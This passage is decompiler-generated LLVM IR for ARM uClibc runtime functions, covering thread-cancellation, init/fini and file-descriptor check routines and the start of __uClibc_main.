dec_label_pc_1657c.dec_label_pc_16548_crit_edge:  ; preds = %dec_label_pc_1657c
  %v0_16554.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_165a4.preheader:                     ; preds = %dec_label_pc_1657c
  %v0_165a41 = load i32, i32* %r7.global-to-local, align 4
  %v1_165a42 = and i32 %v0_165a41, 12
  store i32 %v1_165a42, i32* @r3, align 4
  %v2_165a83 = icmp ugt i32 %v1_165a42, 3
  store i1 %v2_165a83, i1* %cpsr_c.global-to-local, align 1
  %v7_165a85 = icmp eq i32 %v1_165a42, 4
  br i1 %v7_165a85, label %dec_label_pc_16588.lr.ph, label %dec_label_pc_165a4.preheader.dec_label_pc_165b0.loopexit_crit_edge

dec_label_pc_165a4.preheader.dec_label_pc_165b0.loopexit_crit_edge: ; preds = %dec_label_pc_165a4.preheader
  %v1_165b4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_165b0.loopexit

dec_label_pc_16588.lr.ph:                         ; preds = %dec_label_pc_165a4.preheader
  %v0_1658c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1658c = add i32 %v0_1658c.pre, 132
  %v2_165a0 = inttoptr i32 %v1_1658c to i32*
  br label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %dec_label_pc_16588.lr.ph, %dec_label_pc_16588
  %v0_16588 = phi i32 [ %v0_165a41, %dec_label_pc_16588.lr.ph ], [ %v3_165a0, %dec_label_pc_16588 ]
  store i32 %v0_16588, i32* @r2, align 4
  store i32 %v1_1658c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_165a0 = load i32, i32* %v2_165a0, align 4
  store i32 %v3_165a0, i32* %r7.global-to-local, align 4
  %v1_165a4 = and i32 %v3_165a0, 12
  store i32 %v1_165a4, i32* @r3, align 4
  %v7_165a8 = icmp eq i32 %v1_165a4, 4
  br i1 %v7_165a8, label %dec_label_pc_16588, label %dec_label_pc_165a4.dec_label_pc_165b0.loopexit_crit_edge

dec_label_pc_165a4.dec_label_pc_165b0.loopexit_crit_edge: ; preds = %dec_label_pc_16588
  %v2_165a8 = icmp ugt i32 %v1_165a4, 3
  store i1 %v2_165a8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_165b0.loopexit

dec_label_pc_165b0.loopexit:                      ; preds = %dec_label_pc_165a4.preheader.dec_label_pc_165b0.loopexit_crit_edge, %dec_label_pc_165a4.dec_label_pc_165b0.loopexit_crit_edge
  %v1_165b4.pre = phi i32 [ %v1_165b4.pre.pre, %dec_label_pc_165a4.preheader.dec_label_pc_165b0.loopexit_crit_edge ], [ %v1_1658c, %dec_label_pc_165a4.dec_label_pc_165b0.loopexit_crit_edge ]
  %v2_165b0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_165b0

dec_label_pc_165b0:                               ; preds = %dec_label_pc_165b0.loopexit, %entry
  %v1_165b4 = phi i32 [ %v1_165b4.pre, %dec_label_pc_165b0.loopexit ], [ %v0_16530, %entry ]
  %v2_165b0 = phi i32 [ %v2_165b0.pre, %dec_label_pc_165b0.loopexit ], [ %v3_16534, %entry ]
  store i32 %v2_165b0, i32* @r4, align 4
  ret i32 %v1_165b4

; uselistorder directives
  uselistorder i32 %v3_165a0, { 1, 2, 0 }
  uselistorder i32 %v1_1658c, { 0, 2, 1 }
  uselistorder i32 %v0_16578, { 1, 0 }
  uselistorder i32 %v1_1655c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16548, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_165b0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_16588, { 1, 0 }
  uselistorder label %dec_label_pc_1657c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16564, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_165b8 = load i32, i32* @r4, align 4
  store i32 %v3_165b8, i32* %stack_var_-24, align 4
  store i32 56912, i32* %r8.global-to-local, align 4
  %v0_165c0 = call i32 @__aeabi_read_tp()
  %v1_165c4 = add i32 %v0_165c0, -1036
  %v2_165c4 = inttoptr i32 %v1_165c4 to i32*
  %v3_165c4 = load i32, i32* %v2_165c4, align 4
  store i32 %v3_165c4, i32* %r6.global-to-local, align 4
  %v1_165c8 = add i32 %v0_165c0, -1168
  store i32 %v1_165c8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r8.global-to-local, align 4
  %v1_165d046 = or i32 %v3_165c4, 2
  store i32 %v1_165d046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_165d449 = icmp eq i32 %v1_165d046, %v3_165c4
  br i1 %v9_165d449, label %dec_label_pc_16680, label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %entry, %bb.dec_label_pc_165dc_crit_edge
  %v0_165e0 = phi i32 [ %v0_165e0.pre, %bb.dec_label_pc_165dc_crit_edge ], [ %v1_165c8, %entry ]
  %v1_165d051 = phi i32 [ %v1_165d0, %bb.dec_label_pc_165dc_crit_edge ], [ %v1_165d046, %entry ]
  %v0_165e450 = phi i32 [ %v1_16610, %bb.dec_label_pc_165dc_crit_edge ], [ %v3_165c4, %entry ]
  store i32 %v1_165d051, i32* @r1, align 4
  %v1_165e0 = add i32 %v0_165e0, 132
  store i32 %v1_165e0, i32* %r2.global-to-local, align 4
  store i32 %v0_165e450, i32* %r4.global-to-local, align 4
  %v1_165e834 = inttoptr i32 %v1_165e0 to i32*
  %v2_165e835 = load i32, i32* %v1_165e834, align 4
  store i32 %v2_165e835, i32* @r3, align 4
  %v3_165ec37 = icmp uge i32 %v2_165e835, %v0_165e450
  store i1 %v3_165ec37, i1* %cpsr_c.global-to-local, align 1
  %v9_165ec43 = icmp eq i32 %v2_165e835, %v0_165e450
  br i1 %v9_165ec43, label %dec_label_pc_165f4, label %dec_label_pc_1660c

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165dc, %dec_label_pc_165f4.dec_label_pc_165e8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_16604 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16604, label %dec_label_pc_16608, label %dec_label_pc_165f4.dec_label_pc_165e8_crit_edge

dec_label_pc_165f4.dec_label_pc_165e8_crit_edge:  ; preds = %dec_label_pc_165f4
  %v0_165e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165e8 = inttoptr i32 %v0_165e8.pre to i32*
  %v2_165e8 = load i32, i32* %v1_165e8, align 4
  store i32 %v2_165e8, i32* @r3, align 4
  %v3_165ec = icmp uge i32 %v2_165e8, %v1_165ec.pre
  store i1 %v3_165ec, i1* %cpsr_c.global-to-local, align 1
  %v9_165ec = icmp eq i32 %v2_165e8, %v1_165ec.pre
  br i1 %v9_165ec, label %dec_label_pc_165f4, label %dec_label_pc_1660c

dec_label_pc_16608:                               ; preds = %dec_label_pc_165f4
  %v0_16608 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16608, i32* @r3, align 4
  br label %dec_label_pc_1660c

dec_label_pc_1660c:                               ; preds = %dec_label_pc_165dc, %dec_label_pc_165f4.dec_label_pc_165e8_crit_edge, %dec_label_pc_16608
  %v1_16610 = phi i32 [ %v0_16608, %dec_label_pc_16608 ], [ %v2_165e835, %dec_label_pc_165dc ], [ %v2_165e8, %dec_label_pc_165f4.dec_label_pc_165e8_crit_edge ]
  %v1_1660c = load i32, i32* %r6.global-to-local, align 4
  %v3_1660c = icmp uge i32 %v1_16610, %v1_1660c
  store i1 %v3_1660c, i1* %cpsr_c.global-to-local, align 1
  %v9_1660c = icmp eq i32 %v1_16610, %v1_1660c
  br i1 %v9_1660c, label %dec_label_pc_16618, label %bb

bb:                                               ; preds = %dec_label_pc_1660c
  store i32 %v1_16610, i32* %r6.global-to-local, align 4
  %v1_165d0 = or i32 %v1_16610, 2
  store i32 %v1_165d0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_165d4 = icmp eq i32 %v1_165d0, %v1_16610
  br i1 %v9_165d4, label %dec_label_pc_16680, label %bb.dec_label_pc_165dc_crit_edge

bb.dec_label_pc_165dc_crit_edge:                  ; preds = %bb
  %v0_165e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165dc

dec_label_pc_16618:                               ; preds = %dec_label_pc_1660c
  %v0_16618 = load i32, i32* %r5.global-to-local, align 4
  %v1_16618 = and i32 %v0_16618, -69
  store i32 %v1_16618, i32* @r3, align 4
  %v2_1661c = icmp ugt i32 %v1_16618, 9
  store i1 %v2_1661c, i1* %cpsr_c.global-to-local, align 1
  %v7_1661c = icmp eq i32 %v1_16618, 10
  br i1 %v7_1661c, label %dec_label_pc_16624, label %dec_label_pc_16680

dec_label_pc_16624:                               ; preds = %dec_label_pc_16618
  %v1_16628 = load i32, i32* %r7.global-to-local, align 4
  %v2_16628 = add i32 %v1_16628, 544
  %v3_16628 = inttoptr i32 %v2_16628 to i32*
  store i32 -1, i32* %v3_16628, align 4
  %v0_1662c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1662c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16630

dec_label_pc_16630:                               ; preds = %dec_label_pc_16664.dec_label_pc_16630_crit_edge, %dec_label_pc_16624
  %v0_16634 = phi i32 [ %v0_16634.pre, %dec_label_pc_16664.dec_label_pc_16630_crit_edge ], [ %v0_1662c, %dec_label_pc_16624 ]
  %v0_16630 = load i32, i32* %r7.global-to-local, align 4
  %v1_16630 = add i32 %v0_16630, 132
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  %v3_16630 = load i32, i32* %v2_16630, align 4
  store i32 %v0_16634, i32* %r2.global-to-local, align 4
  store i32 %v3_16630, i32* %r4.global-to-local, align 4
  %v1_1663c = or i32 %v3_16630, 16
  store i32 %v1_1663c, i32* @r1, align 4
  %v1_1664022 = inttoptr i32 %v0_16634 to i32*
  %v2_1664023 = load i32, i32* %v1_1664022, align 4
  %v3_1664425 = icmp uge i32 %v2_1664023, %v3_16630
  store i1 %v3_1664425, i1* %cpsr_c.global-to-local, align 1
  %v9_1664431 = icmp eq i32 %v2_1664023, %v3_16630
  br i1 %v9_1664431, label %dec_label_pc_1664c, label %dec_label_pc_16664

dec_label_pc_1664c:                               ; preds = %dec_label_pc_16630, %dec_label_pc_1664c.dec_label_pc_16640_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1665c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1665c, label %dec_label_pc_16660, label %dec_label_pc_1664c.dec_label_pc_16640_crit_edge

dec_label_pc_1664c.dec_label_pc_16640_crit_edge:  ; preds = %dec_label_pc_1664c
  %v0_16640.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16644.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16640 = inttoptr i32 %v0_16640.pre to i32*
  %v2_16640 = load i32, i32* %v1_16640, align 4
  %v3_16644 = icmp uge i32 %v2_16640, %v1_16644.pre
  store i1 %v3_16644, i1* %cpsr_c.global-to-local, align 1
  %v9_16644 = icmp eq i32 %v2_16640, %v1_16644.pre
  br i1 %v9_16644, label %dec_label_pc_1664c, label %dec_label_pc_16664

dec_label_pc_16660:                               ; preds = %dec_label_pc_1664c
  %v0_16660 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %dec_label_pc_16630, %dec_label_pc_1664c.dec_label_pc_16640_crit_edge, %dec_label_pc_16660
  %v0_16664 = phi i32 [ %v0_16660, %dec_label_pc_16660 ], [ %v2_1664023, %dec_label_pc_16630 ], [ %v2_16640, %dec_label_pc_1664c.dec_label_pc_16640_crit_edge ]
  %v1_16664 = phi i32 [ %v0_16660, %dec_label_pc_16660 ], [ %v3_16630, %dec_label_pc_16630 ], [ %v1_16644.pre, %dec_label_pc_1664c.dec_label_pc_16640_crit_edge ]
  %v3_16664 = icmp uge i32 %v0_16664, %v1_16664
  store i1 %v3_16664, i1* %cpsr_c.global-to-local, align 1
  %v9_16664 = icmp eq i32 %v0_16664, %v1_16664
  br i1 %v9_16664, label %dec_label_pc_1666c, label %dec_label_pc_16664.dec_label_pc_16630_crit_edge

dec_label_pc_16664.dec_label_pc_16630_crit_edge:  ; preds = %dec_label_pc_16664
  %v0_16634.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16630

dec_label_pc_1666c:                               ; preds = %dec_label_pc_16664
  store i32 116, i32* @r3, align 4
  %v0_16674 = load i32, i32* %r8.global-to-local, align 4
  %v2_16674 = add i32 %v0_16674, 116
  %v3_16674 = inttoptr i32 %v2_16674 to i32*
  %v4_16674 = load i32, i32* %v3_16674, align 4
  store i32 %v4_16674, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16674)
  %v0_16680.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %entry, %bb, %dec_label_pc_16618, %dec_label_pc_1666c
  %v0_16680 = phi i32 [ %v1_16610, %dec_label_pc_16618 ], [ %v0_16680.pre, %dec_label_pc_1666c ], [ %v3_165c4, %entry ], [ %v1_16610, %bb ]
  %v2_16684 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16684, i32* @r4, align 4
  ret i32 %v0_16680

; uselistorder directives
  uselistorder i32 %v0_16660, { 1, 0 }
  uselistorder i32 %v1_16644.pre, { 0, 2, 1 }
  uselistorder i32 %v1_165d0, { 1, 2, 0 }
  uselistorder i32 %v1_1660c, { 1, 0 }
  uselistorder i32 %v1_16610, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_165ec.pre, { 1, 0 }
  uselistorder i32 %v0_165e450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16680, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16664, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1664c, { 1, 0 }
  uselistorder label %dec_label_pc_1660c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165f4, { 1, 0 }
  uselistorder label %dec_label_pc_165dc, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_166a4 = add i32 %tmp, 4
  %v4_166a4 = inttoptr i32 %v3_166a4 to i32*
  store i32 %arg3, i32* %v4_166a4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_166b0 = icmp eq i32 %arg2, 0
  br i1 %v2_166b0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_166bc = add i32 %tmp, 4
  %v3_166bc = inttoptr i32 %v2_166bc to i32*
  %v4_166bc = load i32, i32* %v3_166bc, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_166c8 = phi i32 [ %tmp, %entry ], [ %v4_166bc, %bb ]
  %v4_166c8 = call i32 @__libc_errno(i32 %v3_166c8)
  ret i32 %v4_166c8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_166fc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_166d8 = load i32, i32* @r4, align 4
  store i32 %v3_166d8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_166fc

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166fc.dec_label_pc_166fc_crit_edge, %dec_label_pc_166fc.lr.ph
  %v1_166fc = phi i32 [ %v1_16708, %dec_label_pc_166fc.dec_label_pc_166fc_crit_edge ], [ 0, %dec_label_pc_166fc.lr.ph ]
  %v0_166fc = phi i32 [ %v0_166fc.pre, %dec_label_pc_166fc.dec_label_pc_166fc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -8), %dec_label_pc_166fc.lr.ph ]
  %v4_166fc = mul i32 %v1_166fc, 4
  %v5_166fc = add i32 %v4_166fc, %v0_166fc
  %v6_166fc = inttoptr i32 %v5_166fc to i32*
  %v7_166fc = load i32, i32* %v6_166fc, align 4
  call void @__pseudo_branch(i32 %v7_166fc)
  %v0_16708 = load i32, i32* %r4.global-to-local, align 4
  %v1_16708 = add i32 %v0_16708, -1
  store i32 %v1_16708, i32* %r4.global-to-local, align 4
  %v2_16708 = icmp eq i32 %v0_16708, 0
  br i1 %v2_16708, label %dec_label_pc_16710, label %dec_label_pc_166fc.dec_label_pc_166fc_crit_edge

dec_label_pc_166fc.dec_label_pc_166fc_crit_edge:  ; preds = %dec_label_pc_166fc
  %v0_166fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_166fc

dec_label_pc_16710:                               ; preds = %dec_label_pc_166fc
  %v0_16714.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_16714 = add i32 %v0_16714.pre, 2008
  %v3_16714 = inttoptr i32 %v2_16714 to i32*
  %v4_16714 = load i32, i32* %v3_16714, align 4
  %v2_16718 = icmp eq i32 %v4_16714, 0
  br i1 %v2_16718, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16710
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16710, %bb
  %v2_16720 = xor i1 %v2_16718, true
  call void @__pseudo_cond_branch(i1 %v2_16720, i32 %v4_16714)
  %v0_16728 = load i32, i32* %r5.global-to-local, align 4
  %v2_16728 = add i32 %v0_16728, 2012
  %v3_16728 = inttoptr i32 %v2_16728 to i32*
  %v4_16728 = load i32, i32* %v3_16728, align 4
  %v2_1672c = icmp eq i32 %v4_16728, 0
  br i1 %v2_1672c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_16734 = xor i1 %v2_1672c, true
  call void @__pseudo_cond_branch(i1 %v2_16734, i32 %v4_16728)
  %v2_16738 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16738, i32* %r4.global-to-local, align 4
  %v1_1673c = load i32, i32* @r0, align 4
  ret i32 %v1_1673c

; uselistorder directives
  uselistorder i32 %v1_16708, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_16754 = load i32, i32* @r4, align 4
  %v6_16754 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_16768 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_16770 = icmp eq i32 %v2_16768, -1
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r3, align 4
  br i1 %v3_16770, label %dec_label_pc_1677c, label %dec_label_pc_16794

dec_label_pc_1677c:                               ; preds = %entry
  %v0_16780 = load i32, i32* @r5, align 4
  %v2_16788 = inttoptr i32 %v0_16780 to i16*
  %v3_16788 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33916), i16* %v2_16788)
  %v1_1678c = load i32, i32* @r4, align 4
  %v1_16790 = icmp ne i32 %v3_16788, %v1_1678c
  call void @__pseudo_cond_branch(i1 %v1_16790, i32 ptrtoint (i32* @global_var_152c8.954 to i32))
  br label %dec_label_pc_16794

dec_label_pc_16794:                               ; preds = %entry, %dec_label_pc_1677c
  %v1_1679c = phi i32 [ %v2_16768, %entry ], [ %v3_16788, %dec_label_pc_1677c ]
  store i32 %v3_16754, i32* @r4, align 4
  store i32 %v6_16754, i32* @r5, align 4
  ret i32 %v1_1679c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_16794, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_167a8 = load i32, i32* @r4, align 4
  store i32 %v3_167a8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r4.global-to-local, align 4
  %v4_167b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 148) to i32*), align 4
  %v1_167bc = inttoptr i32 %v4_167b8 to i32*
  %v2_167bc = load i32, i32* %v1_167bc, align 4
  %v2_167c0 = icmp eq i32 %v2_167bc, 0
  br i1 %v2_167c0, label %dec_label_pc_167c8, label %dec_label_pc_167ec

dec_label_pc_167c8:                               ; preds = %entry
  store i32 4096, i32* %v1_167bc, align 4
  %v0_167d0 = call i32 @__pthread_initialize_minimal()
  %v0_167d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_167d8 = add i32 %v0_167d8, -50352
  %v2_167e0 = icmp eq i32 %v2_167d8, 0
  br i1 %v2_167e0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_167c8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_167c8, %bb
  %v2_167e8 = xor i1 %v2_167e0, true
  call void @__pseudo_cond_branch(i1 %v2_167e8, i32 %v2_167d8)
  %v2_167ec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %entry, %bb4
  %v2_167ec = phi i32 [ %v2_167ec.pre, %bb4 ], [ %v3_167a8, %entry ]
  %.0 = phi i32 [ %v0_167d0, %bb4 ], [ undef, %entry ]
  store i32 %v2_167ec, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_167ec, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_dc04.959 to i32), i32* %r4.global-to-local, align 4
  %v1_1680c = add i32 %tmp, 4
  store i32 %v1_1680c, i32* %ip.global-to-local, align 4
  %v2_16810 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r4.global-to-local, align 4
  %v3_1681c = mul i32 %arg2, 4
  store i32 %v3_1681c, i32* @r7, align 4
  %v4_16824 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 24) to i32*), align 4
  store i32 %v4_16824, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1682c = add i32 %v1_1680c, %v3_1681c
  store i32 %v2_1682c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %stack_var_-416, align 4
  %v4_16834 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 56) to i32*), align 4
  store i32 %v4_16834, i32* %r4.global-to-local, align 4
  %v3_16838 = icmp uge i32 %v2_1682c, %v2_16810
  store i1 %v3_16838, i1* %cpsr_c.global-to-local, align 1
  %v9_16838 = icmp eq i32 %v2_1682c, %v2_16810
  store i1 %v9_16838, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_16840 = inttoptr i32 %v4_16834 to i32*
  store i32 %v2_1682c, i32* %v2_16840, align 4
  br i1 %v9_16838, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_16848 = load i32, i32* %r2.global-to-local, align 4
  %v1_16848 = load i32, i32* %r1.global-to-local, align 4
  %v2_16848 = inttoptr i32 %v1_16848 to i32*
  store i32 %v0_16848, i32* %v2_16848, align 4
  %v2_1684c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1684c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2012, i32* %r2.global-to-local, align 4
  %v0_16858 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_16858, i32* @r6, align 4
  br i1 %v9_16838, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_1686053 = add i32 %v2_1684c, 2012
  %v4_1686054 = inttoptr i32 %v3_1686053 to i32*
  store i32 %arg6, i32* %v4_1686054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1685c = load i32, i32* %ip.global-to-local, align 4
  %v2_1685c = load i32, i32* @r7, align 4
  %v3_1685c = add i32 %v2_1685c, %v1_1685c
  store i32 %v3_1685c, i32* %r3.global-to-local, align 4
  %v3_1686050 = add i32 %v2_1684c, 2012
  %v4_1686051 = inttoptr i32 %v3_1686050 to i32*
  store i32 %arg6, i32* %v4_1686051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1686c = load i32, i32* %r3.global-to-local, align 4
  %v2_1686c = load i32, i32* %r4.global-to-local, align 4
  %v3_1686c = inttoptr i32 %v2_1686c to i32*
  store i32 %v1_1686c, i32* %v3_1686c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_16870 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_16870, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_16878 = bitcast i32* %stack_var_-120 to i8*
  %v4_16878 = call i32 @__GI_memset(i8* %v3_16878, i32 0, i32 120)
  store i32 %v4_16878, i32* %r0.global-to-local, align 4
  %v0_1687c = load i32, i32* %r4.global-to-local, align 4
  %v1_1687c = inttoptr i32 %v0_1687c to i32*
  %v2_1687c = load i32, i32* %v1_1687c, align 4
  br label %dec_label_pc_16888

dec_label_pc_16888:                               ; preds = %dec_label_pc_16888, %bb77
  %storemerge = phi i32 [ %v2_1687c, %bb77 ], [ %v1_16894, %dec_label_pc_16888 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_16888 = inttoptr i32 %storemerge to i32*
  %v2_16888 = load i32, i32* %v1_16888, align 4
  store i32 %v2_16888, i32* %r3.global-to-local, align 4
  %v2_1688c = icmp eq i32 %v2_16888, 0
  %v1_16894 = add i32 %storemerge, 4
  br i1 %v2_1688c, label %dec_label_pc_16894, label %dec_label_pc_16888

dec_label_pc_16894:                               ; preds = %dec_label_pc_16888
